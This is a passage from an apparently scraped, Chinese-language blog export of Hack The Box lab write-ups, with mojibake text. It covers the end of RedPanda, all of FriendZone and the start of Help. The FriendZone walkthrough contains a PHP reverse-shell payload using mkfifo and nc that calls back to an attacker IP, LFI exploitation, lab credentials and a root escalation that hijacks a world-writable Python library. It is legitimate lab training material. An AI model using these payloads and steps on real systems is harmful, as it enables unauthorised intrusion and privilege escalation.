searched for:&#39;,&#39;&#39;).strip() print(result) def default(self, args): try: self.decimal(args) except: print(&quot;%s: command not found&quot; % (args)) RCE().cmdloop() lucifiel@MacBookPro î‚° ~/Desktop î‚° python3 exploip.py __ __ __ ______ __ _______ __ _______ __ | | | | | | / | | | | ____| | | | ____| | | | | | | | | | ,----&#39; | | | |__ | | | |__ | | | | | | | | | | | | | __| | | | __| | | | `----. | `--&#39; | | `----. | | | | | | | |____ | `----. |_______| \\______/ \\______| |__| |__| |__| |_______| |_______| $ whoami woodenk $ id uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk) å¯ä»¥æˆåŠŸæ‰§è¡Œï¼Œä½†æ˜¯è¿˜æ˜¯æ²¡æœ‰ shell æ–¹ä¾¿ï¼Œå…ˆå»çœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆå¯ä»¥æ‹¿åˆ° shell çš„ä¸œè¥¿å§ åœ¨æ–‡ä»¶ /opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java ä¸­ï¼Œæ‰¾åˆ°äº†ä¸€æ®µå‡­è¯ conn = DriverManager.getConnection(&quot;jdbc:mysql://localhost:3306/red_panda&quot;, &quot;woodenk&quot;, &quot;RedPandazRule&quot;); username = woodenk password = RedPandazRule lucifiel@MacBookPro î‚° ~/Desktop î‚° ssh woodenk@10.10.11.170 woodenk@10.10.11.170&#39;s password: Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Mon 24 Oct 2022 03:15:10 AM UTC System load: 0.02 Usage of /: 80.9% of 4.30GB Memory usage: 41% Swap usage: 0% Processes: 213 Users logged in: 0 IPv4 address for eth0: 10.10.11.170 IPv6 address for eth0: dead:beef::250:56ff:feb9:1c2 0 updates can be applied immediately. The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Mon Oct 24 03:14:58 2022 from 10.10.14.11 woodenk@redpanda:~$ whoami&amp;&amp;id woodenk uid=1000(woodenk) gid=1000(woodenk) groups=1000(woodenk) æˆåŠŸæ‹¿åˆ° user æƒé™çš„ shell woodenk@redpanda:~$ cat user.txt a00d4342cd040f667d3dbfee34a49451 æˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"FriendZone - Hackthebox","slug":"Hackthebox - FriendZone","date":"2022-09-20T11:38:36.000Z","updated":"2023-05-20T01:50:17.000Z","comments":true,"path":"2022/09/20/Hackthebox - FriendZone/","link":"","permalink":"http://www.lucifiel.com/2022/09/20/Hackthebox%20-%20FriendZone/","excerpt":"","text":"Hackthebox - FriendZoneé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æ”¶é›†Nmapâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# nmap -sS -sC -sV -A -p- --min-rate 5000 10.10.10.123 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-09 13:14 CST Nmap scan report for 10.10.10.123 Host is up (0.27s latency). Not shown: 65528 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA) | 256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA) |_ 256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519) 53/tcp open domain ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.11.3-1ubuntu1.2-Ubuntu 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Friend Zone Escape software 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 443/tcp open ssl/http Apache httpd 2.4.29 | tls-alpn: |_ http/1.1 |_http-server-header: Apache/2.4.29 (Ubuntu) |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO | Not valid before: 2018-10-05T21:02:30 |_Not valid after: 2018-11-04T21:02:30 |_http-title: 404 Not Found 445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP) No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.92%E=4%D=9/9%OT=21%CT=1%CU=36793%PV=Y%DS=2%DC=T%G=Y%TM=631ACC10 OS:%P=aarch64-unknown-linux-gnu)SEQ(SP=101%GCD=1%ISR=107%TI=Z%CI=I%II=I%TS= OS:A)OPS(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M5 OS:39ST11NW7%O6=M539ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=712 OS:0)ECN(R=Y%DF=Y%T=40%W=7210%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S OS:+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q= OS:)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A% OS:A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y% OS:DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T= OS:40%CD=S) Network Distance: 2 hops Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: mean: -1h00m00s, deviation: 1h43m54s, median: -1s | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown) | smb-os-discovery: | OS: Windows 6.1 (Samba 4.7.6-Ubuntu) | Computer name: friendzone | NetBIOS computer name: FRIENDZONE\\x00 | Domain name: \\x00 | FQDN: friendzone |_ System time: 2022-09-09T08:15:47+03:00 | smb2-time: | date: 2022-09-09T05:15:49 |_ start_date: N/A | smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required TRACEROUTE (using port 3306/tcp) HOP RTT ADDRESS 1 277.35 ms 10.10.14.1 2 277.61 ms 10.10.10.123 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 60.57 seconds Http å°±ä¸€å¼ é™æ€å›¾ç‰‡ï¼Œè‚¯å®šä¸åœ¨è¿™é‡Œäº† Ftpâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# ftp 10.10.10.123 Connected to 10.10.10.123. 220 (vsFTPd 3.0.3) Name (10.10.10.123:root): anonymous 331 Please specify the password. Password: 530 Login incorrect. ftp: Login failed æœ¬å°ä¸å…è®¸ ftp åŒ¿åç™»é™† â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# searchsploit vsftpd 3.0.3 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- vsftpd 3.0.3 - Remote Denial of Service | multiple/remote/49719.py ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results Exploit-DB ä¹Ÿåªæ‰¾åˆ°ä¸€ä¸ªè¿œç¨‹DDOSçš„æ¼æ´ï¼Œæ²¡ä»€ä¹ˆå®é™…æ„ä¹‰ Sambaâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# smbmap -H 10.10.10.123 [+] Guest session IP: 10.10.10.123:445 Name: 10.10.10.123 Disk Permissions Comment ---- ----------- ------- print$ NO ACCESS Printer Drivers Files NO ACCESS FriendZone Samba Server Files /etc/Files general READ ONLY FriendZone Samba Server Files Development READ, WRITE FriendZone Samba Server Files IPC$ NO ACCESS IPC Service (FriendZone server (Samba, Ubuntu)) â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# smbclient --list 10.10.10.123 -U &quot;&quot; Password for [WORKGROUP\\]: Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers Files Disk FriendZone Samba Server Files /etc/Files general Disk FriendZone Samba Server Files Development Disk FriendZone Samba Server Files IPC$ IPC IPC Service (FriendZone server (Samba, Ubuntu)) Reconnecting with SMB1 for workgroup listing. Server Comment --------- ------- Workgroup Master --------- ------- WORKGROUP FRIENDZONE â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# nmap -p 445 --script=smb-enum-shares 10.10.10.123 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-20 09:50 CST Nmap scan report for 10.10.10.123 Host is up (1.2s latency). PORT STATE SERVICE 445/tcp open microsoft-ds Host script results: | smb-enum-shares: | account_used: guest | \\\\10.10.10.123\\Development: | Type: STYPE_DISKTREE | Comment: FriendZone Samba Server Files | Users: 0 | Max Users: &lt;unlimited&gt; | Path: C:\\etc\\Development | Anonymous access: READ/WRITE | Current user access: READ/WRITE | \\\\10.10.10.123\\Files: | Type: STYPE_DISKTREE | Comment: FriendZone Samba Server Files /etc/Files | Users: 0 | Max Users: &lt;unlimited&gt; | Path: C:\\etc\\hole | Anonymous access: &lt;none&gt; | Current user access: &lt;none&gt; | \\\\10.10.10.123\\IPC$: | Type: STYPE_IPC_HIDDEN | Comment: IPC Service (FriendZone server (Samba, Ubuntu)) | Users: 1 | Max Users: &lt;unlimited&gt; | Path: C:\\tmp | Anonymous access: READ/WRITE | Current user access: READ/WRITE | \\\\10.10.10.123\\general: | Type: STYPE_DISKTREE | Comment: FriendZone Samba Server Files | Users: 0 | Max Users: &lt;unlimited&gt; | Path: C:\\etc\\general | Anonymous access: READ/WRITE | Current user access: READ/WRITE | \\\\10.10.10.123\\print$: | Type: STYPE_DISKTREE | Comment: Printer Drivers | Users: 0 | Max Users: &lt;unlimited&gt; | Path: C:\\var\\lib\\samba\\printers | Anonymous access: &lt;none&gt; |_ Current user access: &lt;none&gt; Nmap done: 1 IP address (1 host up) scanned in 95.19 seconds â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# smbclient -N \\\\\\\\10.10.10.123\\\\Development Try &quot;help&quot; to get a list of possible commands. smb: \\&gt; ls . D 0 Tue Sep 20 09:51:26 2022 .. D 0 Tue Sep 13 22:56:24 2022 3545824 blocks of size 1024. 1658488 blocks available å››å¤§å¸¸ç”¨æŒ‡ä»¤æŒ¨ä¸ªæ‰§è¡Œä¸€éï¼Œæ‹¿åˆ°çš„ä¿¡æ¯è¶Šå¤šè¶Šå¥½ Development æ–‡ä»¶å¤¹æ˜¯ç©ºçš„ï¼Œçœ‹çœ‹å¦ä¸€ä¸ªæœ‰è¯»å–æƒé™çš„æ–‡ä»¶å¤¹ â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# smbclient -N \\\\\\\\10.10.10.123\\\\general Try &quot;help&quot; to get a list of possible commands. smb: \\&gt; ls . D 0 Thu Jan 17 04:10:51 2019 .. D 0 Tue Sep 13 22:56:24 2022 creds.txt N 57 Wed Oct 10 07:52:42 2018 3545824 blocks of size 1024. 1658484 blocks available è¿™è¾¹æœ‰ä¸€ä¸ª creds.txt æ–‡ä»¶ï¼Œè¯»å–çœ‹ä¸€ä¸‹ creds for the admin THING: admin:WORKWORKHhallelujah@# ä¼¼ä¹æ˜¯ä¸€ä¸ªè´¦å·å¯†ç  æ¼æ´åˆ©ç”¨æˆ‘ä»¬å›åˆ° Http é¡µé¢ï¼Œä¼šçœ‹åˆ°æœ‰ä¸€ä¸ªé‚®ç®± &#x69;&#110;&#102;&#111;&#x40;&#x66;&#x72;&#x69;&#101;&#x6e;&#x64;&#x7a;&#111;&#110;&#101;&#x70;&#111;&#x72;&#116;&#x61;&#x6c;&#x2e;&#x72;&#x65;&#x64; æ—¢ç„¶æ˜¯åŸŸåé‚®ç®±ï¼Œé‚£æŒ‰ç…§å¸¸ç†æ¥è¯´æ˜¯ä¼šå­˜åœ¨è¿™ä¸ªåŸŸåçš„ æŸ¥çœ‹äº†ä¸€ä¸‹è¯ä¹¦ï¼Œå‘ç°ç¡®å®å­˜åœ¨åŸŸåï¼Œä½†æ˜¯æ˜¯ friendzone.redï¼Œå»æ·»åŠ ä¸€ä¸ª hosts è§£æ echo 10.10.10.123 friendzone.red &gt;&gt; /etc/hosts â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# dig axfr friendzone.red @10.10.10.123 ; &lt;&lt;&gt;&gt; DiG 9.18.1-1-Debian &lt;&lt;&gt;&gt; axfr friendzone.red @10.10.10.123 ;; global options: +cmd friendzone.red. 604800 IN SOA localhost. root.localhost. 2 604800 86400 2419200 604800 friendzone.red. 604800 IN AAAA ::1 friendzone.red. 604800 IN NS localhost. friendzone.red. 604800 IN A 127.0.0.1 administrator1.friendzone.red. 604800 IN A 127.0.0.1 hr.friendzone.red. 604800 IN A 127.0.0.1 uploads.friendzone.red. 604800 IN A 127.0.0.1 friendzone.red. 604800 IN SOA localhost. root.localhost. 2 604800 86400 2419200 604800 ;; Query time: 1439 msec ;; SERVER: 10.10.10.123#53(10.10.10.123) (TCP) ;; WHEN: Tue Sep 20 10:09:07 CST 2022 ;; XFR size: 8 records (messages 1, bytes 289) æšä¸¾åŸŸåä¿¡æ¯ï¼Œå‘ç°äº†ä¸‰ä¸ªå­åŸŸå administrator1.friendzone.red hr.friendzone.red uploads.friendzone.red éƒ½æ·»åŠ åˆ° hosts https://administrator1.friendzone.red/ è®¿é—®åå‘ç°æ˜¯ä¸€ä¸ªç™»é™†é¡µé¢ ä½¿ç”¨æˆ‘ä»¬çš„è´¦å·å¯†ç è¿›è¡Œç™»å½• ç™»é™†æˆåŠŸï¼Œè®©æˆ‘ä»¬è®¿é—® &#x2F;dashboard.php å¤§æ¦‚æ„æ€æ˜¯è¯´ï¼Œè¿™æ˜¯ä¸€ä¸ªç”¨äºæœ‹å‹åœˆçš„æ™ºèƒ½ç…§ç‰‡è„šæœ¬ï¼Œä½†æ˜¯è¿™æ˜¯ä¸€ä¸ªåˆçº§çš„ php å¼€å‘äººå‘˜å†™çš„ä»£ç ï¼Œç„¶åè¿™ä¸ªè„šæœ¬è¿˜æ²¡ç»è¿‡æµ‹è¯•ï¼Œæ‰€ä»¥æœ‰ä¸€ä¸ªå‚æ•°è¢«é—å¿˜äº†ï¼Œè¾“å…¥è¿™ä¸ªå‚æ•°å¯ä»¥ç°å®å›¾ç‰‡ï¼Œé»˜è®¤æ˜¯ image_id&#x3D;a.jpg&amp;pagename&#x3D;timestamp çœ‹åˆ°è¿™å‚æ•°æ„æˆï¼Œæ„Ÿè§‰å­˜åœ¨ LFIï¼ˆæœ¬åœ°æ–‡ä»¶åŒ…å«ï¼‰ï¼Œç„¶ååœ¨ä¹‹å‰çš„ Development å¤„ï¼Œæ„Ÿè§‰æœ‰ç‚¹ä¸å¯¹ï¼Œä¸€ä¸ªå¯è¯»å†™çš„åœ°å€å´æ²¡æœ‰å†…å®¹ï¼Œåº”è¯¥æ˜¯ç»™æˆ‘ä»¬ä¸Šä¼ çš„ç‚¹ã€‚ç„¶åæˆ‘ä»¬ä¹ŸçŸ¥é“å®ƒçš„ç»å¯¹è·¯å¾„ï¼Œå»å°è¯•ä¸Šä¼ åˆ° Developmentï¼Œå†å» LFI è¯»å–è¯•è¯• \\\\10.10.10.123\\Development: | Type: STYPE_DISKTREE | Comment: FriendZone Samba Server Files | Users: 0 | Max Users: &lt;unlimited&gt; | Path: C:\\etc\\Development | Anonymous access: READ/WRITE | Current user access: READ/WRITE &lt;?php system(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.3 4444 &gt;/tmp/f&#39;); ?&gt; æŠŠ shell å†™å…¥åˆ° php æ–‡ä»¶ï¼Œç„¶åå»ä¸Šä¼  â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# smbclient //10.10.10.123/development -U &quot;&quot; Password for [WORKGROUP\\]: Try &quot;help&quot; to get a list of possible commands. smb: \\&gt; put shell.php putting file shell.php as \\shell.php (0.1 kb/s) (average 0.1 kb/s) ç„¶åå»åŒ…å«è¯•è¯• nc -nvlp 4444 https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=/etc/Development/shell â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.3] from (UNKNOWN) [10.10.10.123] 39570 /bin/sh: 0: can&#39;t access tty; job control turned off $ python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;; www-data@FriendZone:/var/www/admin$ whoami&amp;&amp;id whoami&amp;&amp;id www-data uid=33(www-data) gid=33(www-data) groups=33(www-data) æˆåŠŸè·å¾— shel www-data@FriendZone:/home/friend$ cat user.txt cat user.txt a4977797fce2cc139c86af2adc340a29 æˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶ æƒé™æå‡Userwww-data@FriendZone:/var/www$ ls ls admin friendzoneportal html uploads friendzone friendzoneportaladmin mysql_data.conf www-data@FriendZone:/var/www$ cat mysql_data.conf cat mysql_data.conf for development process this is the mysql creds for user friend db_user=friend db_pass=Agpyu12!0.213$ db_name=FZ åœ¨ç™»å…¥åçš„ç›®å½•æ‰¾åˆ°äº†ä¸€ä¸ª mysql_data.conf æ–‡ä»¶ï¼Œé‡Œé¢åŒ…å«äº†ä¸€äº›å‡­è¯ ww-data@FriendZone:/var/www$ cat /etc/passwd|grep bash cat /etc/passwd|grep bash root:x:0:0:root:/root:/bin/bash friend:x:1000:1000:friend,,,:/home/friend:/bin/bash å¯ä»¥çœ‹åˆ°å½“å‰ä¹Ÿæœ‰è¿™ä¸ªç”¨æˆ·ï¼Œå»å°è¯• ssh ç™»é™†è¯•è¯• â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# ssh friend@10.10.10.123 The authenticity of host &#39;10.10.10.123 (10.10.10.123)&#39; can&#39;t be established. ED25519 key fingerprint is SHA256:ERMyoo9aM0mxdTvIh0kooJS+m3GwJr6Q51AG9/gTYx4. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;10.10.10.123&#39; (ED25519) to the list of known hosts. friend@10.10.10.123&#39;s password: Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-36-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage You have mail. Last login: Thu Jan 24 01:20:15 2019 from 10.10.14.3 friend@FriendZone:~$ whoami&amp;&amp;id friend uid=1000(friend) gid=1000(friend) groups=1000(friend),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare) ç™»å…¥æˆåŠŸ Rootä½¿ç”¨ pspy64 è·‘ä¸€ä¸‹ 2022/09/20 05:44:01 CMD: UID=0 PID=1417 | /bin/sh -c /opt/server_admin/reporter.py 2022/09/20 05:44:01 CMD: UID=0 PID=1416 | /bin/sh -c /opt/server_admin/reporter.py å‘ç°æœ‰ä¸€ä¸ªè„šæœ¬ &#x2F;opt&#x2F;server_admin&#x2F;reporter.py ä¸€ç›´åœ¨è¿è¡Œ friend@FriendZone:~$ ls -la /opt/server_admin/reporter.py -rwxr--r-- 1 root root 424 Jan 16 2019 /opt/server_admin/reporter.py å¹¶ä¸”è¿˜æ˜¯ root æƒé™çš„ friend@FriendZone:~$ cat /opt/server_admin/reporter.py #!/usr/bin/python import os to_address = &quot;admin1@friendzone.com&quot; from_address = &quot;admin2@friendzone.com&quot; print &quot;[+] Trying to send email to %s&quot;%to_address #command = &#39;&#39;&#39; mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass &quot;PAPAP&quot;&#39;&#39;&#39; #os.system(command) # I need to edit the script later # Sam ~ python developer æˆ‘ä»¬æ²¡æœ‰å†™å…¥æƒé™ï¼Œä½†æ˜¯å®ƒä¼šå¯¼å…¥ä¸€ä¸ª os åº“ï¼Œå’±ä»¬å»æŸ¥çœ‹ä¸€ä¸‹æ˜¯å¦æœ‰æƒé™ friend@FriendZone:/usr/lib/python2.7$ ls -la|grep os.py -rwxrwxrwx 1 root root 25910 Jan 15 2019 os.py å’±ä»¬æ˜¯æœ‰å†™å…¥æƒé™çš„ï¼Œé‚£å°±å†™å…¥ä¸€æ®µæ¶æ„ç¨‹åºå°±å¥½äº† echo &quot;system(&#39;chmod +s /bin/bash&#39;)&quot; &gt;&gt; os.py friend@FriendZone:/usr/lib/python2.7$ ls -la /bin/bash -rwsr-sr-x 1 root root 1113504 Apr 4 2018 /bin/bash ç­‰å¾…ä¸¤åˆ†é’Ÿï¼Œçœ‹åˆ°åŠ ä¸Š s æƒé™åï¼Œå°±å¯ä»¥ææƒäº† friend@FriendZone:/usr/lib/python2.7$ /bin/bash -p bash-4.4# whoami&amp;&amp;id root uid=1000(friend) gid=1000(friend) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare),1000(friend) æˆåŠŸææƒåˆ° root æƒé™ bash-4.4# cat /root/root.txt d93cbc3ed65646042735f3ee312fe2c5 æˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Help - Hackthebox","slug":"Hackthebox - Help","date":"2022-09-05T11:38:36.000Z","updated":"2023-05-20T01:52:39.000Z","comments":true,"path":"2022/09/05/Hackthebox - Help/","link":"","permalink":"http://www.lucifiel.com/2022/09/05/Hackthebox%20-%20Help/","excerpt":"","text":"Hackthebox - Helpé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æ”¶é›†Nmapâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# nmap -sS -sC -sV -A -p- --min-rate 5000 10.10.10.121 Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-01 09:14 CST Nmap scan report for 10.10.10.121 Host is up (0.35s latency). Not shown: 65532 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA) | 256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA) |_ 256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519) 80/tcp open http Apache httpd 2.4.18 |_http-title: Did not follow redirect to http://help.htb/ |_http-server-header: Apache/2.4.18 (Ubuntu) 3000/tcp open http Node.js Express framework |_http-title: Site doesn&#39;t have a title (application/json; charset=utf-8). Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.16 (95%), Linux 3.18 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.10 - 4.11 (93%), DD-WRT (Linux 3.18) (93%), Linux 4.10 (93%), Linux 4.2 (93%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 1720/tcp) HOP RTT ADDRESS 1 349.63 ms 10.10.14.1 2 349.25 ms 10.10.10.121 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 55.59 seconds Http ç›´æ¥è®¿é—®ä¼šè¢«è·³è½¬åˆ° htlp.htb å»åŠ ä¸€ä¸ª hosts echo 10.10.10.121 help.htb &gt;&gt; /etc/hosts ç°åœ¨å¯ä»¥è®¿é—®äº†ï¼Œä¸è¿‡æ˜¯ apache2 çš„é»˜è®¤ç•Œé¢ï¼Œå» fuzz ä¸€ä¸‹ Fuzzâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# gobuster dir -u http://help.htb/ --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 200 --no-error =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://help.htb/ [+] Method: GET [+] Threads: 200 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/09/04 20:36:06 Starting gobuster in directory enumeration mode =============================================================== /javascript (Status: 301) [Size: 309] [--&gt; http://help.htb/javascript/] /support (Status: 301) [Size: 306] [--&gt; http://help.htb/support/] /server-status (Status: 403) [Size: 296] =============================================================== 2022/09/04 20:37:41 Finished =============================================================== æœ‰ä¸€ä¸ª support ç›®å½•ï¼Œè®¿é—®ä¸€ä¸‹ æ˜¯ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œå¹¶ä¸”å¯ä»¥ç¡®å®šæ¡†æ¶ä¸º helpdeskz â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# searchsploit helpdeskz ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- HelpDeskZ 1.0.2 - Arbitrary File Upload | php/webapps/40300.py HelpDeskZ &lt; 1.0.2 - (Authenticated) SQL Injection / Unauthorized File Download | php/webapps/41200.py ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results å¯ä»¥çœ‹åˆ°æœ‰ä¸¤ä¸ªæ¼æ´ï¼Œåˆ†åˆ«æ˜¯ 1.0.2 ç‰ˆæœ¬çš„ä»»æ„æ–‡ä»¶ä¸Šä¼ ä»¥åŠ 1.0.2 ç‰ˆæœ¬ä»¥ä¸‹çš„ sql æ³¨å…¥ï¼Œä½†æ˜¯æˆ‘ä»¬æ— æ³•ç¡®å®šå½“å‰ cms çš„ç‰ˆæœ¬å· â”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop] â””â”€# curl http://help.htb/support/README.md {% image /images/logo.png '' '' %} Version: 1.0.2 from 1st June 2015&lt;br&gt; Developed by: Evolution Script S.A.C.&lt;br&gt; [Help Desk Software HelpDeskZ](http://www.helpdeskz.com) HelpDeskZ is a free PHP based software which allows you to manage your site&#39;s support with a web-based support ticket system. ## Requirements HelpDeskZ requires: - PHP 5.x - MySQL database - GD Library (only for captcha verification) - Mod_rewrite (only if you want to use permalinks)- ## Upgrading To upgrade your HelpDeskZ from previous versions, please read the file UPGRADING.txt ## Installation steps - Connect with FTP to the &lt;em&gt;public folder&lt;/em&gt; of your server where the rest of your Web site is - Create a new folder where you will install HelpDeskZ. Name it anything you like, for example &quot;helpdesk&quot; or &quot;support&quot;.&lt;br&gt; Example: /public_html/support&lt;br&gt; Corresponding URL: http://www.site.com/support - Upload all HelpDeskZ files to your server. - Open **/install** in your browser, for example (modify to your URL):&lt;br /&gt; http://www.site.com/support/install - The HelpDeskZ setup script will run. Click &lt;strong&gt;INSTALL HELPDESKZ&lt;/strong&gt; and follow the instructions through License agreement, Check Setup and Database settings. - Before closing the install script **DELETE the &quot;install&quot; directory from your server!** - Now it&#39;s time to setup your help desk! Open the &lt;strong&gt;staff&lt;/strong&gt; panel in your browser, for example:&lt;br /&gt; http://www.site.com/support/?v=staff&lt;br /&gt; Use the login details that you entered in the installation process. - Go to &lt;strong&gt;Settings -&gt; General&lt;/strong&gt; to get to the settings page. - Take some time and get familiar with all of the available settings. Most of them should be self-explanatory. - If you want to use permalinks like http://www.site.com/support/staff/ then you have to enable this option on Settings -&gt; General -&gt; Helpdesk -&gt; Use SEO-friendly URLs - Good luck using HelpDeskZ! - ## Email Piping HelpDeskZ supports email piping, this allows the auto-creation of tickets from incoming emails to a set email address. - To enable email piping for your help desk follow this &lt;a href=&quot;http://www.helpdeskz.com/help/knowledgebase/2/article/10/setting-up-email-piping&quot;&gt;email piping tutorial.&lt;/a&gt; ## Customize the look For detailed information please see this &lt;a href=&quot;http://www.helpdeskz.com/help/knowledgebase/2/article/6/how-do-i-customize-helpdeskz-look&quot;&gt;knowledgebase article.&lt;/a&gt; ## Translate HelpDeskZ to your language To translate HelpDeskZ read &lt;a href=&quot;http://www.helpdeskz.com/help/knowledgebase/2/article/8/how-can-i-translate-helpdeskz&quot;&gt;How can I translate HelpDeskZ.&lt;/a&gt; é€šè¿‡ README.md å¾—çŸ¥å½“å‰ç‰ˆæœ¬ä¸º 1.0.2 